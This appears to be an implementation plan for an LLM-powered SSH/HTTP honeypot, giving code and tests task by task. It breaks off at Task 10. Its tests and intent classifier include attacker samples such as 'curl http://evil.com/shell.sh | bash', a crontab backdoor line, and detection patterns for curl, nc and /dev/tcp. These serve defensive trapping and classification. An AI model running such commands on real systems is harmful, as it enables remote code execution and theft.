# LLM-Powered Honeypot Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a three-layer LLM-driven honeypot with SSH + HTTP ingress, FastAPI LLM engine, SQLite logging, and a React dashboard deployed to Vercel.

**Architecture:** Layer 1 (SSH/HTTP servers) captures attacker input and POSTs JSON to Layer 2 (FastAPI LLM engine). Layer 2 checks a rule-based cache first, falls back to Ollama for unknown commands, classifies intent, and returns a JSON response. Layer 3 reads the shared SQLite database and serves a React dashboard + auto-generated threat reports.

**Tech Stack:** Python 3.11, paramiko, FastAPI, uvicorn, httpx, python-dotenv, pytest, React 18, Vite, Tailwind CSS, Recharts, react-markdown, Vercel.

---

## File Map

```
honeypot/
  .env
  requirements.txt
  docker-compose.yml
  honeypot.db                         (auto-created)
  .ssh_host_key                       (auto-created)

  layer1/
    __init__.py
    ssh_server.py
    http_server.py
    session_manager.py
    llm_client.py
    logger.py

  layer2/
    __init__.py
    main.py
    cache.py
    prompt_builder.py
    ollama_client.py
    intent_classifier.py
    db.py

  layer3/
    __init__.py
    stats_api.py
    report_generator.py
    frontend/                         (Vite React app)
      package.json
      vite.config.ts
      src/
        main.tsx
        App.tsx
        pages/
          Dashboard.tsx
          Sessions.tsx
          Reports.tsx
        components/
          LiveFeed.tsx
          IntentChart.tsx
          CommandChart.tsx

  tests/
    layer1/
      test_session_manager.py
      test_logger.py
    layer2/
      test_cache.py
      test_intent_classifier.py
      test_prompt_builder.py
      test_respond_endpoint.py
    layer3/
      test_stats_api.py
    conftest.py

  scripts/
    demo.sh
```

---

## Task 1: Project Setup

**Files:**
- Create: `.env`
- Create: `requirements.txt`
- Create: `tests/conftest.py`
- Create all `__init__.py` files

- [ ] **Step 1: Create directory structure**

```bash
mkdir -p honeypot/{layer1,layer2,layer3/frontend/src/{pages,components},tests/{layer1,layer2,layer3},scripts}
touch honeypot/{layer1,layer2,layer3,tests/layer1,tests/layer2,tests/layer3}/__init__.py
```

- [ ] **Step 2: Create `.env`**

```env
OLLAMA_MODEL=llama3.1
OLLAMA_HOST=http://localhost:11434
SSH_PORT=2222
HTTP_PORT=8080
LLM_ENGINE_PORT=8000
STATS_API_PORT=8001
DB_PATH=./honeypot.db
SESSION_TIMEOUT_SECONDS=600
```

- [ ] **Step 3: Create `requirements.txt`**

```
paramiko==3.4.0
fastapi==0.111.0
uvicorn[standard]==0.29.0
httpx==0.27.0
python-dotenv==1.0.1
pytest==8.2.0
pytest-asyncio==0.23.6
httpx==0.27.0
```

- [ ] **Step 4: Create `tests/conftest.py`**

```python
import os
import pytest
import tempfile

@pytest.fixture
def tmp_db(tmp_path):
    db_path = str(tmp_path / "test.db")
    os.environ["DB_PATH"] = db_path
    return db_path
```

- [ ] **Step 5: Install dependencies**

```bash
cd honeypot && pip install -r requirements.txt
```

- [ ] **Step 6: Commit**

```bash
git add honeypot/
git commit -m "feat: project scaffold and dependencies"
```

---

## Task 2: SQLite Schema

**Files:**
- Create: `layer2/db.py`
- Create: `tests/layer2/test_db.py` (inline, kept minimal)

- [ ] **Step 1: Write failing test**

Create `tests/layer2/test_db.py`:

```python
import sqlite3
import os
import pytest
from layer2.db import init_db

def test_init_db_creates_tables(tmp_db):
    init_db(tmp_db)
    conn = sqlite3.connect(tmp_db)
    tables = {row[0] for row in conn.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()}
    conn.close()
    assert "sessions" in tables
    assert "commands" in tables
    assert "http_requests" in tables
```

- [ ] **Step 2: Run to confirm failure**

```bash
cd honeypot && python -m pytest tests/layer2/test_db.py -v
```
Expected: `ModuleNotFoundError: No module named 'layer2.db'`

- [ ] **Step 3: Create `layer2/db.py`**

```python
import sqlite3
import os
from dotenv import load_dotenv

load_dotenv()

def get_db_path() -> str:
    return os.getenv("DB_PATH", "./honeypot.db")

def get_conn(db_path: str | None = None) -> sqlite3.Connection:
    conn = sqlite3.connect(db_path or get_db_path())
    conn.row_factory = sqlite3.Row
    return conn

def init_db(db_path: str | None = None) -> None:
    conn = get_conn(db_path)
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS sessions (
            session_id   TEXT PRIMARY KEY,
            protocol     TEXT,
            attacker_ip  TEXT,
            start_time   DATETIME DEFAULT CURRENT_TIMESTAMP,
            end_time     DATETIME,
            total_cmds   INTEGER DEFAULT 0,
            threat_level TEXT,
            report       TEXT
        );
        CREATE TABLE IF NOT EXISTS commands (
            id           INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id   TEXT,
            timestamp    DATETIME DEFAULT CURRENT_TIMESTAMP,
            command      TEXT,
            response     TEXT,
            intent       TEXT,
            confidence   REAL,
            cache_hit    BOOLEAN
        );
        CREATE TABLE IF NOT EXISTS http_requests (
            id               INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id       TEXT,
            timestamp        DATETIME DEFAULT CURRENT_TIMESTAMP,
            method           TEXT,
            path             TEXT,
            body             TEXT,
            response_code    INTEGER,
            harvested_creds  TEXT
        );
    """)
    conn.commit()
    conn.close()
```

- [ ] **Step 4: Run test**

```bash
python -m pytest tests/layer2/test_db.py -v
```
Expected: `PASSED`

- [ ] **Step 5: Commit**

```bash
git add layer2/db.py tests/layer2/test_db.py
git commit -m "feat: SQLite schema init"
```

---

## Task 3: Layer 1 — Logger

**Files:**
- Create: `layer1/logger.py`
- Create: `tests/layer1/test_logger.py`

- [ ] **Step 1: Write failing test**

```python
# tests/layer1/test_logger.py
import sqlite3
import pytest
from layer2.db import init_db
from layer1.logger import Logger

def test_log_session_start(tmp_db):
    init_db(tmp_db)
    log = Logger(tmp_db)
    log.session_start("sess1", "ssh", "1.2.3.4")
    conn = sqlite3.connect(tmp_db)
    row = conn.execute("SELECT * FROM sessions WHERE session_id='sess1'").fetchone()
    conn.close()
    assert row is not None
    assert row[1] == "ssh"
    assert row[2] == "1.2.3.4"

def test_log_command(tmp_db):
    init_db(tmp_db)
    log = Logger(tmp_db)
    log.session_start("sess1", "ssh", "1.2.3.4")
    log.command("sess1", "whoami", "admin", "reconnaissance", 0.95, True)
    conn = sqlite3.connect(tmp_db)
    row = conn.execute("SELECT * FROM commands WHERE session_id='sess1'").fetchone()
    conn.close()
    assert row[3] == "whoami"
    assert row[5] == "reconnaissance"
    assert row[7] == 1  # cache_hit True

def test_log_session_end(tmp_db):
    init_db(tmp_db)
    log = Logger(tmp_db)
    log.session_start("sess1", "ssh", "1.2.3.4")
    log.command("sess1", "ls", "bin boot etc", "reconnaissance", 0.9, True)
    log.session_end("sess1", "Medium")
    conn = sqlite3.connect(tmp_db)
    row = conn.execute("SELECT * FROM sessions WHERE session_id='sess1'").fetchone()
    conn.close()
    assert row[4] is not None   # end_time set
    assert row[5] == 1          # total_cmds
    assert row[6] == "Medium"   # threat_level
```

- [ ] **Step 2: Run to confirm failure**

```bash
python -m pytest tests/layer1/test_logger.py -v
```
Expected: `ModuleNotFoundError`

- [ ] **Step 3: Create `layer1/logger.py`**

```python
import sqlite3
from datetime import datetime
from layer2.db import get_conn, init_db

class Logger:
    def __init__(self, db_path: str | None = None):
        self.db_path = db_path
        init_db(db_path)

    def session_start(self, session_id: str, protocol: str, attacker_ip: str) -> None:
        conn = get_conn(self.db_path)
        conn.execute(
            "INSERT OR IGNORE INTO sessions (session_id, protocol, attacker_ip) VALUES (?,?,?)",
            (session_id, protocol, attacker_ip),
        )
        conn.commit()
        conn.close()

    def command(self, session_id: str, command: str, response: str,
                intent: str, confidence: float, cache_hit: bool) -> None:
        conn = get_conn(self.db_path)
        conn.execute(
            "INSERT INTO commands (session_id, command, response, intent, confidence, cache_hit) VALUES (?,?,?,?,?,?)",
            (session_id, command, response, intent, confidence, int(cache_hit)),
        )
        conn.commit()
        conn.close()

    def http_request(self, session_id: str, method: str, path: str,
                     body: str, response_code: int, harvested_creds: str | None = None) -> None:
        conn = get_conn(self.db_path)
        conn.execute(
            "INSERT INTO http_requests (session_id, method, path, body, response_code, harvested_creds) VALUES (?,?,?,?,?,?)",
            (session_id, method, path, body, response_code, harvested_creds),
        )
        conn.commit()
        conn.close()

    def session_end(self, session_id: str, threat_level: str) -> None:
        conn = get_conn(self.db_path)
        conn.execute(
            """UPDATE sessions SET
               end_time=CURRENT_TIMESTAMP,
               total_cmds=(SELECT COUNT(*) FROM commands WHERE session_id=?),
               threat_level=?
               WHERE session_id=?""",
            (session_id, threat_level, session_id),
        )
        conn.commit()
        conn.close()
```

- [ ] **Step 4: Run tests**

```bash
python -m pytest tests/layer1/test_logger.py -v
```
Expected: all `PASSED`

- [ ] **Step 5: Commit**

```bash
git add layer1/logger.py tests/layer1/test_logger.py
git commit -m "feat: Layer 1 logger with SQLite writes"
```

---

## Task 4: Layer 1 — Session Manager

**Files:**
- Create: `layer1/session_manager.py`
- Create: `tests/layer1/test_session_manager.py`

- [ ] **Step 1: Write failing test**

```python
# tests/layer1/test_session_manager.py
import pytest
from layer1.session_manager import SessionManager

FAKE_DIRS = {"/", "/etc", "/home", "/home/admin", "/var", "/var/www",
             "/var/www/html", "/tmp", "/proc", "/usr", "/usr/bin", "/opt"}

@pytest.fixture
def mgr():
    return SessionManager()

def test_create_session(mgr):
    s = mgr.create("sess1", "root", "1.2.3.4")
    assert s["current_dir"] == "/home/admin"
    assert s["user"] == "root"
    assert s["history"] == []

def test_cd_to_valid_dir(mgr):
    mgr.create("s1", "root", "1.1.1.1")
    new_dir, err = mgr.handle_cd("s1", "cd /etc")
    assert new_dir == "/etc"
    assert err == ""
    assert mgr.get("s1")["current_dir"] == "/etc"

def test_cd_to_invalid_dir(mgr):
    mgr.create("s1", "root", "1.1.1.1")
    _, err = mgr.handle_cd("s1", "cd /nonexistent")
    assert "No such file or directory" in err
    assert mgr.get("s1")["current_dir"] == "/home/admin"

def test_cd_dotdot(mgr):
    mgr.create("s1", "root", "1.1.1.1")
    mgr.handle_cd("s1", "cd /var/www/html")
    new_dir, err = mgr.handle_cd("s1", "cd ..")
    assert new_dir == "/var/www"
    assert err == ""

def test_history_capped_at_10(mgr):
    mgr.create("s1", "root", "1.1.1.1")
    for i in range(12):
        mgr.push_history("s1", f"cmd{i}")
    assert len(mgr.get("s1")["history"]) == 10
    assert mgr.get("s1")["history"][-1] == "cmd11"
```

- [ ] **Step 2: Run to confirm failure**

```bash
python -m pytest tests/layer1/test_session_manager.py -v
```

- [ ] **Step 3: Create `layer1/session_manager.py`**

```python
FAKE_DIRS = {
    "/", "/etc", "/home", "/home/admin", "/home/deploy",
    "/var", "/var/www", "/var/www/html", "/tmp",
    "/proc", "/usr", "/usr/bin", "/opt",
}

class SessionManager:
    def __init__(self):
        self._sessions: dict[str, dict] = {}

    def create(self, session_id: str, user: str, ip: str) -> dict:
        self._sessions[session_id] = {
            "current_dir": "/home/admin",
            "user": user,
            "ip": ip,
            "history": [],
        }
        return self._sessions[session_id]

    def get(self, session_id: str) -> dict:
        return self._sessions[session_id]

    def push_history(self, session_id: str, command: str) -> None:
        h = self._sessions[session_id]["history"]
        h.append(command)
        if len(h) > 10:
            self._sessions[session_id]["history"] = h[-10:]

    def handle_cd(self, session_id: str, command: str) -> tuple[str, str]:
        parts = command.split(maxsplit=1)
        current = self._sessions[session_id]["current_dir"]

        if len(parts) == 1 or parts[1] == "~":
            target = "/home/admin"
        elif parts[1] == "..":
            target = "/".join(current.rstrip("/").split("/")[:-1]) or "/"
        elif parts[1].startswith("/"):
            target = parts[1].rstrip("/") or "/"
        else:
            target = (current.rstrip("/") + "/" + parts[1])

        if target in FAKE_DIRS:
            self._sessions[session_id]["current_dir"] = target
            return target, ""
        return current, f"bash: cd: {parts[1] if len(parts) > 1 else ''}: No such file or directory\n"

    def delete(self, session_id: str) -> None:
        self._sessions.pop(session_id, None)
```

- [ ] **Step 4: Run tests**

```bash
python -m pytest tests/layer1/test_session_manager.py -v
```
Expected: all `PASSED`

- [ ] **Step 5: Commit**

```bash
git add layer1/session_manager.py tests/layer1/test_session_manager.py
git commit -m "feat: Layer 1 session state manager"
```

---

## Task 5: Layer 2 — Rule-Based Cache

**Files:**
- Create: `layer2/cache.py`
- Create: `tests/layer2/test_cache.py`

- [ ] **Step 1: Write failing tests**

```python
# tests/layer2/test_cache.py
from layer2.cache import CacheHandler

def test_ls_root():
    ch = CacheHandler()
    result = ch.handle("ls", "/", "admin")
    assert result is not None
    assert "etc" in result

def test_whoami():
    ch = CacheHandler()
    assert ch.handle("whoami", "/home/admin", "root") == "root\n"

def test_pwd():
    ch = CacheHandler()
    assert ch.handle("pwd", "/etc", "admin") == "/etc\n"

def test_cache_miss_returns_none():
    ch = CacheHandler()
    assert ch.handle("curl http://evil.com/shell.sh | bash", "/", "admin") is None

def test_cat_etc_passwd():
    ch = CacheHandler()
    result = ch.handle("cat /etc/passwd", "/", "admin")
    assert result is not None
    assert "root:x:0:0" in result
    assert "dbadmin" in result

def test_cat_bait_env():
    ch = CacheHandler()
    result = ch.handle("cat /var/www/html/.env", "/", "admin")
    assert result is not None
    assert "DB_PASSWORD" in result

def test_shadow_permission_denied():
    ch = CacheHandler()
    result = ch.handle("cat /etc/shadow", "/", "admin")
    assert "Permission denied" in result

def test_id_command():
    ch = CacheHandler()
    result = ch.handle("id", "/", "admin")
    assert "uid=" in result
```

- [ ] **Step 2: Run to confirm failure**

```bash
python -m pytest tests/layer2/test_cache.py -v
```

- [ ] **Step 3: Create `layer2/cache.py`**

```python
import re

_ETC_PASSWD = """\
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
admin:x:1000:1000:admin,,,:/home/admin:/bin/bash
deploy:x:1001:1001::/home/deploy:/bin/bash
backup:x:1002:1002::/home/backup:/bin/sh
dbadmin:x:1003:1003::/home/dbadmin:/bin/bash
"""

_ETC_HOSTS = """\
127.0.0.1\tlocalhost
127.0.1.1\tweb-server-01
10.0.0.5\tdb-internal
10.0.0.10\tbackup-server
"""

_BAIT_ENV = """\
APP_ENV=production
APP_KEY=base64:3lV7kQmN2pXwR8sT1uYvZaB4cDeF6gHi
DB_HOST=localhost
DB_DATABASE=ecommerce_db
DB_USERNAME=dbadmin
DB_PASSWORD=Sup3rS3cr3t!2019
MAIL_HOST=smtp.mailgun.org
MAIL_PASSWORD=mg_smtp_pass_2019
AWS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
"""

_PROC_VERSION = "Linux version 4.15.0-213-generic (buildd@lcy02-amd64-013) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #224-Ubuntu SMP Mon Jun 19 13:30:52 UTC 2023\n"

_LS_MAP = {
    "/":              "bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  srv  sys  tmp  usr  var\n",
    "/etc":           "cron.d  crontab  group  hosts  hostname  issue  passwd  shadow  ssh  sudoers  timezone\n",
    "/home":          "admin  backup  dbadmin  deploy\n",
    "/home/admin":    ".bash_history  .bashrc  .profile  backup.sql\n",
    "/var/www/html":  ".env  index.php  wp-config.php  wp-admin  wp-content  wp-includes\n",
    "/tmp":           "\n",
    "/var/www":       "html\n",
    "/var":           "backups  cache  lib  log  mail  opt  run  spool  www\n",
    "/proc":          "1  cpuinfo  meminfo  net  version\n",
    "/opt":           "\n",
    "/usr/bin":       "awk  bash  cat  curl  find  grep  ls  python3  ssh  tar  wget\n",
}

_KNOWN_CACHE_COMMANDS = [
    r"^ls(\s+-\w+)*(\s+\S+)?$",
    r"^pwd$",
    r"^whoami$",
    r"^id$",
    r"^hostname$",
    r"^uname(\s+-\w+)*$",
    r"^uptime$",
    r"^date$",
    r"^cat\s+\S+$",
    r"^echo\s+.*$",
]

class CacheHandler:
    def handle(self, command: str, current_dir: str, user: str) -> str | None:
        cmd = command.strip()

        if cmd in ("pwd",):
            return current_dir + "\n"

        if cmd in ("whoami",):
            return user + "\n"

        if cmd in ("id",):
            uid = 0 if user == "root" else 1000
            gid = uid
            return f"uid={uid}({user}) gid={gid}({user}) groups={gid}({user})\n"

        if cmd in ("hostname",):
            return "web-server-01\n"

        if re.match(r"^uname(\s+-\w+)*$", cmd):
            return "Linux web-server-01 4.15.0-213-generic #224-Ubuntu SMP Mon Jun 19 13:30:52 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\n"

        if cmd == "date":
            return "Mon Jun 19 08:42:17 UTC 2023\n"

        if cmd == "uptime":
            return " 08:42:17 up 312 days, 14:03,  1 user,  load average: 0.08, 0.03, 0.01\n"

        if re.match(r"^ls(\s+-\w+)*(\s+\S+)?$", cmd):
            parts = cmd.split()
            target = None
            for p in parts[1:]:
                if not p.startswith("-"):
                    target = p if p.startswith("/") else (current_dir.rstrip("/") + "/" + p)
                    break
            target = target or current_dir
            return _LS_MAP.get(target, "ls: cannot access '" + target + "': No such file or directory\n")

        if re.match(r"^cat\s+\S+$", cmd):
            path = cmd.split(maxsplit=1)[1]
            if not path.startswith("/"):
                path = current_dir.rstrip("/") + "/" + path
            return self._cat(path)

        if re.match(r"^echo\s+.*$", cmd):
            return cmd.split(maxsplit=1)[1].strip('"\'') + "\n"

        return None  # cache miss

    def _cat(self, path: str) -> str:
        if path == "/etc/passwd":
            return _ETC_PASSWD
        if path == "/etc/hosts":
            return _ETC_HOSTS
        if path == "/proc/version":
            return _PROC_VERSION
        if path == "/var/www/html/.env":
            return _BAIT_ENV
        if path == "/etc/shadow":
            return "cat: /etc/shadow: Permission denied\n"
        if path == "/etc/sudoers":
            return "cat: /etc/sudoers: Permission denied\n"
        if path in ("/home/admin/backup.sql", "/home/admin/.bash_history",
                    "/var/www/html/wp-config.php"):
            return self._cat_interesting(path)
        return f"cat: {path}: No such file or directory\n"

    def _cat_interesting(self, path: str) -> str:
        if path == "/home/admin/backup.sql":
            return ("-- MySQL dump 10.13  Distrib 5.7.42\n"
                    "-- Host: localhost    Database: ecommerce_db\n"
                    "-- ------------------------------------------------------\n"
                    "CREATE DATABASE ecommerce_db;\n"
                    "USE ecommerce_db;\n"
                    "INSERT INTO users VALUES (1,'admin','$2y$10$abcdefghijk...');\n")
        if path == "/home/admin/.bash_history":
            return ("ls\ncd /var/www/html\ncat .env\nmysql -u dbadmin -pSup3rS3cr3t!2019 ecommerce_db\n"
                    "sudo systemctl restart nginx\ntail -f /var/log/nginx/error.log\n")
        if path == "/var/www/html/wp-config.php":
            return ("<?php\ndefine('DB_NAME','ecommerce_db');\n"
                    "define('DB_USER','dbadmin');\ndefine('DB_PASSWORD','Sup3rS3cr3t!2019');\n"
                    "define('DB_HOST','localhost');\n")
        return ""
```

- [ ] **Step 4: Run tests**

```bash
python -m pytest tests/layer2/test_cache.py -v
```
Expected: all `PASSED`

- [ ] **Step 5: Commit**

```bash
git add layer2/cache.py tests/layer2/test_cache.py
git commit -m "feat: Layer 2 rule-based command cache with fake filesystem"
```

---

## Task 6: Layer 2 — Intent Classifier

**Files:**
- Create: `layer2/intent_classifier.py`
- Create: `tests/layer2/test_intent_classifier.py`

- [ ] **Step 1: Write failing tests**

```python
# tests/layer2/test_intent_classifier.py
from layer2.intent_classifier import classify

def test_recon_commands():
    assert classify("whoami") == ("reconnaissance", 0.95)
    assert classify("cat /etc/passwd") == ("reconnaissance", 0.95)
    assert classify("uname -a") == ("reconnaissance", 0.95)
    assert classify("ps aux") == ("reconnaissance", 0.95)

def test_privesc_commands():
    assert classify("sudo su") == ("privilege_escalation", 0.95)
    assert classify("sudo -l") == ("privilege_escalation", 0.95)
    assert classify("find / -perm -u=s -type f") == ("privilege_escalation", 0.95)

def test_exfil_commands():
    assert classify("curl http://evil.com/shell.sh | bash") == ("data_exfiltration", 0.95)
    assert classify("wget http://evil.com") == ("data_exfiltration", 0.95)
    assert classify("cat /etc/shadow") == ("data_exfiltration", 0.95)

def test_persistence_commands():
    assert classify("crontab -e") == ("persistence", 0.95)
    assert classify("echo '* * * * * /tmp/backdoor' >> /etc/crontab") == ("persistence", 0.95)

def test_lateral_movement():
    assert classify("ssh root@10.0.0.5") == ("lateral_movement", 0.95)
    assert classify("nmap -sV 10.0.0.0/24") == ("lateral_movement", 0.95)

def test_unknown_returns_low_confidence():
    intent, conf = classify("some-custom-binary --flag")
    assert conf < 0.5
```

- [ ] **Step 2: Run to confirm failure**

```bash
python -m pytest tests/layer2/test_intent_classifier.py -v
```

- [ ] **Step 3: Create `layer2/intent_classifier.py`**

```python
import re

_RULES: list[tuple[str, list[str]]] = [
    ("privilege_escalation", [
        r"\bsudo\b", r"\bsu\b", r"\bchmod\s+[0-7]*7[0-7]*\b",
        r"/etc/sudoers", r"-perm\s+-u=s", r"\bSUID\b",
    ]),
    ("data_exfiltration", [
        r"\bcurl\b", r"\bwget\b", r"\bscp\b", r"\bnc\b",
        r"\bbase64\b", r"/etc/shadow", r">\s*/dev/tcp",
    ]),
    ("persistence", [
        r"\bcrontab\b", r"\.bashrc", r"authorized_keys",
        r"\bsystemctl\b.*enable", r"/etc/crontab",
    ]),
    ("lateral_movement", [
        r"\bssh\b\s+\S+@", r"\bnmap\b", r"\bping\b",
        r"/etc/hosts", r"\barp\b",
    ]),
    ("reconnaissance", [
        r"\bwhoami\b", r"\bid\b", r"\buname\b", r"\bls\b",
        r"\bcat\b", r"\bfind\b", r"\bgrep\b", r"\bps\b",
        r"\bnetstat\b", r"\bss\b", r"\bifconfig\b", r"\bip\s+addr\b",
        r"/etc/passwd", r"\bhostname\b",
    ]),
]

def classify(command: str) -> tuple[str, float]:
    for intent, patterns in _RULES:
        for pattern in patterns:
            if re.search(pattern, command, re.IGNORECASE):
                return intent, 0.95
    return "unknown", 0.3
```

- [ ] **Step 4: Run tests**

```bash
python -m pytest tests/layer2/test_intent_classifier.py -v
```
Expected: all `PASSED`

- [ ] **Step 5: Commit**

```bash
git add layer2/intent_classifier.py tests/layer2/test_intent_classifier.py
git commit -m "feat: Layer 2 keyword-based intent classifier"
```

---

## Task 7: Layer 2 — Prompt Builder

**Files:**
- Create: `layer2/prompt_builder.py`
- Create: `tests/layer2/test_prompt_builder.py`

- [ ] **Step 1: Write failing test**

```python
# tests/layer2/test_prompt_builder.py
from layer2.prompt_builder import build_messages

def test_system_prompt_contains_persona():
    msgs = build_messages("ls -la", "/etc", "admin", [])
    system = msgs[0]["content"]
    assert "Ubuntu 18.04" in system
    assert "web-server-01" in system

def test_user_message_contains_command():
    msgs = build_messages("cat /etc/passwd", "/etc", "root", ["whoami", "id"])
    user_msg = msgs[-1]["content"]
    assert "cat /etc/passwd" in user_msg
    assert "/etc" in user_msg

def test_history_included():
    msgs = build_messages("ls", "/", "admin", ["whoami", "id"])
    user_msg = msgs[-1]["content"]
    assert "whoami" in user_msg
    assert "id" in user_msg
```

- [ ] **Step 2: Run to confirm failure**

```bash
python -m pytest tests/layer2/test_prompt_builder.py -v
```

- [ ] **Step 3: Create `layer2/prompt_builder.py`**

```python
_SYSTEM_PROMPT = """\
You are an old Ubuntu 18.04.6 LTS server named web-server-01 running an e-commerce backend.
You have been running for over 2 years with minimal maintenance.
Your IP is 10.0.0.2. The internal database server is at 10.0.0.5.

Respond ONLY with the raw terminal output the command would produce.
No explanations. No markdown. No apologies. Just the terminal output.

Key facts about this system:
- Kernel: 4.15.0-213-generic
- Users: root, admin (uid=1000), deploy (uid=1001), dbadmin (uid=1003)
- /home/admin/backup.sql exists (MySQL dump from 2022)
- /var/www/html/.env has database credentials
- /etc/sudoers allows admin to run ALL without password (misconfiguration)
- nginx is running on port 80, MySQL on port 3306
- The system has not been updated since 2021

If the command would take a long time (e.g. find /), output a partial result then stop.
If the command is nonsensical, output "command not found" or appropriate shell error.
Keep responses concise — a real old server, not a documentation site.
"""

def build_messages(
    command: str,
    current_dir: str,
    user: str,
    history: list[str],
) -> list[dict]:
    history_block = ""
    if history:
        history_block = "Recent commands the attacker ran:\n" + "\n".join(f"  $ {h}" for h in history[-5:]) + "\n\n"

    user_content = (
        f"{history_block}"
        f"Current directory: {current_dir}\n"
        f"Current user: {user}\n"
        f"Command to respond to: {command}\n"
    )

    return [
        {"role": "system", "content": _SYSTEM_PROMPT},
        {"role": "user", "content": user_content},
    ]
```

- [ ] **Step 4: Run tests**

```bash
python -m pytest tests/layer2/test_prompt_builder.py -v
```
Expected: all `PASSED`

- [ ] **Step 5: Commit**

```bash
git add layer2/prompt_builder.py tests/layer2/test_prompt_builder.py
git commit -m "feat: Layer 2 Ubuntu 18.04 persona prompt builder"
```

---

## Task 8: Layer 2 — Ollama Client

**Files:**
- Create: `layer2/ollama_client.py`

No unit test for this (requires live Ollama). Tested via integration in Task 9.

- [ ] **Step 1: Create `layer2/ollama_client.py`**

```python
import os
import httpx
from dotenv import load_dotenv

load_dotenv()

def get_ollama_host() -> str:
    return os.getenv("OLLAMA_HOST", "http://localhost:11434")

def get_model() -> str:
    return os.getenv("OLLAMA_MODEL", "llama3.1")

def generate(messages: list[dict], stream: bool = False) -> str:
    """Send messages to Ollama and return the full response text."""
    url = get_ollama_host() + "/api/chat"
    payload = {
        "model": get_model(),
        "messages": messages,
        "stream": False,
    }
    try:
        resp = httpx.post(url, json=payload, timeout=15.0)
        resp.raise_for_status()
        return resp.json()["message"]["content"]
    except httpx.TimeoutException:
        return "bash: command timed out\n"
    except Exception:
        return "command not found\n"

def generate_streaming(messages: list[dict]):
    """Yield response tokens one at a time for SSH streaming."""
    url = get_ollama_host() + "/api/chat"
    payload = {
        "model": get_model(),
        "messages": messages,
        "stream": True,
    }
    try:
        with httpx.stream("POST", url, json=payload, timeout=20.0) as resp:
            import json
            for line in resp.iter_lines():
                if line:
                    data = json.loads(line)
                    token = data.get("message", {}).get("content", "")
                    if token:
                        yield token
                    if data.get("done"):
                        break
    except Exception:
        yield "command not found\n"
```

- [ ] **Step 2: Smoke-test against live Ollama (skip if Ollama not running locally)**

```bash
cd honeypot && python -c "
from layer2.ollama_client import generate
from layer2.prompt_builder import build_messages
msgs = build_messages('whoami', '/home/admin', 'admin', [])
print(generate(msgs))
"
```
Expected: something like `admin` or a shell prompt output.

- [ ] **Step 3: Commit**

```bash
git add layer2/ollama_client.py
git commit -m "feat: Layer 2 Ollama client with streaming support"
```

---

## Task 9: Layer 2 — FastAPI /respond Endpoint

**Files:**
- Create: `layer2/main.py`
- Create: `tests/layer2/test_respond_endpoint.py`

- [ ] **Step 1: Write failing test**

```python
# tests/layer2/test_respond_endpoint.py
import pytest
from fastapi.testclient import TestClient
from unittest.mock import patch

@pytest.fixture
def client():
    from layer2.main import app
    return TestClient(app)

def test_respond_cache_hit(client):
    payload = {
        "session_id": "test-1",
        "protocol": "ssh",
        "command": "whoami",
        "current_dir": "/home/admin",
        "user": "admin",
        "history": [],
    }
    resp = client.post("/respond", json=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert data["session_id"] == "test-1"
    assert data["cache_hit"] is True
    assert "admin" in data["response"]
    assert data["intent"] in ("reconnaissance", "unknown")

def test_respond_returns_required_fields(client):
    payload = {
        "session_id": "test-2",
        "protocol": "ssh",
        "command": "pwd",
        "current_dir": "/etc",
        "user": "root",
        "history": [],
    }
    resp = client.post("/respond", json=payload)
    data = resp.json()
    for key in ("session_id", "response", "intent", "confidence", "cache_hit"):
        assert key in data

def test_respond_http_protocol(client):
    payload = {
        "session_id": "test-3",
        "protocol": "http",
        "command": "GET /wp-admin",
        "current_dir": "/",
        "user": "anonymous",
        "history": [],
    }
    resp = client.post("/respond", json=payload)
    assert resp.status_code == 200
```

- [ ] **Step 2: Run to confirm failure**

```bash
python -m pytest tests/layer2/test_respond_endpoint.py -v
```

- [ ] **Step 3: Create `layer2/main.py`**

```python
from fastapi import FastAPI
from pydantic import BaseModel
from layer2.cache import CacheHandler
from layer2.ollama_client import generate
from layer2.prompt_builder import build_messages
from layer2.intent_classifier import classify

app = FastAPI(title="HoneyPot LLM Engine")
_cache = CacheHandler()

class RespondRequest(BaseModel):
    session_id: str
    protocol: str
    command: str
    current_dir: str
    user: str
    history: list[str] = []

class RespondResponse(BaseModel):
    session_id: str
    response: str
    intent: str
    confidence: float
    cache_hit: bool

@app.post("/respond", response_model=RespondResponse)
def respond(req: RespondRequest) -> RespondResponse:
    cached = _cache.handle(req.command, req.current_dir, req.user)
    if cached is not None:
        intent, conf = classify(req.command)
        return RespondResponse(
            session_id=req.session_id,
            response=cached,
            intent=intent,
            confidence=conf,
            cache_hit=True,
        )

    messages = build_messages(req.command, req.current_dir, req.user, req.history)
    response_text = generate(messages)
    intent, conf = classify(req.command)

    return RespondResponse(
        session_id=req.session_id,
        response=response_text,
        intent=intent,
        confidence=conf,
        cache_hit=False,
    )

@app.get("/health")
def health():
    return {"status": "ok"}
```

- [ ] **Step 4: Run tests**

```bash
python -m pytest tests/layer2/test_respond_endpoint.py -v
```
Expected: all `PASSED` (cache-hit tests pass without Ollama; Ollama tests pass if running)

- [ ] **Step 5: Start Layer 2 manually and verify**

```bash
cd honeypot && uvicorn layer2.main:app --port 8000 --reload
# In another terminal:
curl -s -X POST http://localhost:8000/respond \
  -H "Content-Type: application/json" \
  -d '{"session_id":"s1","protocol":"ssh","command":"whoami","current_dir":"/home/admin","user":"admin","history":[]}' | python -m json.tool
```
Expected: JSON with `cache_hit: true` and `response: "admin\n"`

- [ ] **Step 6: Commit**

```bash
git add layer2/main.py tests/layer2/test_respond_endpoint.py
git commit -m "feat: Layer 2 FastAPI /respond endpoint wired to cache + Ollama"
```

---

## Task 10: Layer 1 — LLM Client

**Files:**
- Create: `layer1/llm_client.py`

- [ ] **Step 1: Create `layer1/llm_client.py`**

```python
import os
import httpx
